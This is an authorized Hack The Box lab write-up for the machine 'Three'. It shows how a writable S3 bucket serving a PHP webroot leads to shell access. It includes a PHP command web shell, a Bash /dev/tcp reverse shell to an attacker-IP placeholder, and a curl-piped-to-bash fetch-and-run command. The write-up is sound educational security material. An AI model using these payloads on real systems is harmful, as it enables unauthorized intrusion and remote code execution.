# Three - HTB Write-up

> **Scope note:** This write-up documents an authorized Hack The Box lab.

## Summary

Three is a Linux machine that demonstrates the security risks of a poorly configured S3-compatible object storage service.

The target hosts a PHP web application which uses an S3 bucket as its webroot. By enumerating the web application and discovering the `s3` subdomain, we can communicate directly with the S3 service.

The bucket allows files to be uploaded. Since the website is PHP-based and the bucket contains the site's webroot, we can upload a PHP web shell and execute operating-system commands through the browser.

We then use the web shell to download and execute a Bash reverse shell, obtaining access as `www-data` and retrieving the flag.

    -> Nmap enumeration
    -> Discover HTTP and SSH
    -> Identify thetoppers.htb
    -> Add hostname to /etc/hosts
    -> Enumerate virtual hosts
    -> Discover s3.thetoppers.htb
    -> Identify an S3-compatible service
    -> Enumerate the S3 bucket
    -> Discover writable webroot
    -> Upload PHP web shell
    -> Confirm remote command execution
    -> Create reverse shell
    -> Obtain www-data shell
    -> Read /var/www/flag.txt

> **Note:** The machine may take a few minutes to fully boot because the S3-compatible LocalStack service needs time to start.

---

# Enumeration

## Nmap

We begin by scanning the target to identify the available ports and services.

    sudo nmap -sV <TARGET_IP>

The scan reveals two open ports:

    PORT   STATE SERVICE VERSION
    22/tcp open  ssh
    80/tcp open  http

Port `22` is running SSH, while port `80` is running an Apache HTTP server.

The web service is therefore the primary attack surface.

---

# Web Enumeration

## Website

We open the target in a browser and are presented with a static concert ticket booking website.

The website itself does not appear to contain anything immediately interesting.

Reviewing the page source reveals that the Contact form submits requests to:

    /action_page.php

This confirms that the web application is using PHP.

Visiting:

    /index.php

also confirms that the application is PHP-based.

The Contact section contains an email address using the domain:

    thetoppers.htb

This suggests that the web server is using a virtual host.

---

# Virtual Host Enumeration

## /etc/hosts

We add the discovered domain to our local hosts file so that it resolves to the target:

    echo "<TARGET_IP> thetoppers.htb" | sudo tee -a /etc/hosts

We can now access:

    http://thetoppers.htb

The website loads correctly.

---

## Subdomain Enumeration

Since the target is using virtual hosting, we enumerate for additional subdomains.

Gobuster can be used in VHOST mode:

    gobuster vhost -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u http://thetoppers.htb --append-domain

The `vhost` option performs virtual-host brute forcing.

The wordlist contains possible subdomain names, which Gobuster tests by modifying the HTTP `Host` header.

The enumeration reveals:

    s3.thetoppers.htb

We add the new hostname to `/etc/hosts`:

    echo "<TARGET_IP> s3.thetoppers.htb" | sudo tee -a /etc/hosts

Visiting:

    http://s3.thetoppers.htb

returns:

    {"status": "running"}

This indicates that an S3-compatible service is running.

---

# S3 Enumeration

## What is S3?

Amazon S3 is an object-storage service where files are stored inside containers called buckets.

The files stored inside an S3 bucket are referred to as objects.

In this machine, the S3 service is exposed through the `s3.thetoppers.htb` hostname.

We can interact with it using the AWS CLI.

---

## AWS CLI Configuration

We configure the AWS CLI:

    aws configure

For this lab, arbitrary values can be supplied for the access key, secret key, region, and output format because the service does not require valid AWS authentication.

Example:

    AWS Access Key ID: temp
    AWS Secret Access Key: temp
    Default region name: temp
    Default output format: temp

---

## Listing Buckets

We can enumerate the available buckets:

    aws --endpoint=http://s3.thetoppers.htb s3 ls

The bucket:

    thetoppers.htb

is discovered.

We then enumerate its contents:

    aws --endpoint=http://s3.thetoppers.htb s3 ls s3://thetoppers.htb

The bucket contains:

    images/
    .htaccess
    index.php

This is significant because these files resemble the webroot of the website running on port `80`.

The Apache web server is therefore using the S3 bucket as its storage.

---

# Exploiting the Writable S3 Bucket

## Uploading a PHP Web Shell

Because the bucket is writable and appears to contain the website's webroot, we can attempt to upload a PHP file.

We create a simple PHP command-execution shell:

    echo '<?php system($_GET["cmd"]); ?>' > shell.php

The PHP `system()` function executes the command supplied through the `cmd` parameter.

We upload the shell into the bucket:

    aws --endpoint=http://s3.thetoppers.htb s3 cp shell.php s3://thetoppers.htb

The upload succeeds.

We can now access the file through the web server:

    http://thetoppers.htb/shell.php

---

# Remote Command Execution

## Testing the Shell

We test command execution by supplying the `id` command:

    http://thetoppers.htb/shell.php?cmd=id

The response confirms command execution:

    uid=33(www-data) gid=33(www-data) groups=33(www-data)

This confirms that we have **remote command execution** on the target as the `www-data` user.

---

# Reverse Shell

## Finding the VPN IP

We need the IP address of our Kali machine so that the target can connect back to us.

We can find the HTB VPN interface using:

    ifconfig

We use the `tun0` address as our callback IP.

---

## Creating the Reverse Shell

We create a Bash reverse-shell file named:

    shell.sh

The contents are:

    #!/bin/bash
    bash -i >& /dev/tcp/<YOUR_IP_ADDRESS>/1337 0>&1

This tells the target to open a Bash shell and connect back to our machine on port `1337`.

---

## Start the Listener

On our Kali machine, we start a Netcat listener:

    nc -nvlp 1337

We now have a listener waiting for the target to connect back.

---

## Host the Reverse Shell

We also need to make `shell.sh` available to the target.

From the directory containing `shell.sh`, start a Python HTTP server:

    python3 -m http.server 8000

The target can now download the file from:

    http://<YOUR_IP_ADDRESS>:8000/shell.sh

---

# Triggering the Reverse Shell

We use the PHP web shell to instruct the target to download the Bash script and pipe it directly into Bash:

    http://thetoppers.htb/shell.php?cmd=curl%20<YOUR_IP_ADDRESS>:8000/shell.sh|bash

The target downloads the script from our HTTP server and executes it.

Our Netcat listener receives the connection.

We now have a reverse shell on the target as:

    www-data

---

# Retrieving the Flag

The flag is located at:

    /var/www/flag.txt

We read it using:

    cat /var/www/flag.txt

The flag is displayed, completing the machine.

---

# Attack Path

    Target
      |
      v
    Nmap
      |
      +-------------------+
      |                   |
      v                   v
    SSH :22            HTTP :80
                          |
                          v
                    thetoppers.htb
                          |
                          v
                    VHOST Enumeration
                          |
                          v
                  s3.thetoppers.htb
                          |
                          v
                    S3 Enumeration
                          |
                          v
                    thetoppers.htb
                        Bucket
                          |
                          v
                    Writable Webroot
                          |
                          v
                    Upload shell.php
                          |
                          v
                  Remote Command Exec
                          |
                          v
                    www-data
                          |
                          v
                  Reverse Shell
                          |
                          v
                  /var/www/flag.txt
                          |
                          v
                       HTB Flag

---

# Key Takeaways

- Always begin with service enumeration to understand the attack surface.
- Web applications may reveal useful hostnames through source code and application content.
- Virtual-host enumeration can uncover additional services that are not visible from the main website.
- An S3-compatible service may expose object storage that is directly connected to a web application's webroot.
- Misconfigured bucket permissions can allow attackers to upload files.
- If uploaded files are placed inside a webroot and executed by the server, file upload can become remote code execution.
- A simple PHP web shell can be used to confirm command execution.
- Once command execution is obtained, a reverse shell provides a more useful interactive session.
- The overall vulnerability chain was:

    Virtual Host Discovery
            +
    Exposed S3 Service
            +
    Writable Bucket
            +
    PHP File Upload
            +
    Remote Code Execution
            +
    Reverse Shell
            =
    Shell Access as www-data
``` ````
